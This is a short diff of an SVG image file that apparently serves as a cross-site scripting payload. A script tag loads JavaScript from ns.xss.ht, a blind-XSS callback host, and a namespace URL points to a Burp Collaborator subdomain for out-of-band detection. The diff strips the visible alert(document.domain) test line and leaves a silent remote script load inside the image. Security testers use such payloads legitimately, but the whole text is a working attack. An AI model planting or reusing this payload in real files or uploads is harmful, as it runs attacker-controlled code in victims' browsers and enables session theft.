@@ -8,6 +8,5 @@
     xmlns:xlink="http://086sxmct4fdnmdc4rakoyblhd8jz9ny.burpcollaborator.net/1999/xlink">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript" src="https://ns.xss.ht">
-      alert(document.domain);
-   </script>
+      </script>
 </svg>
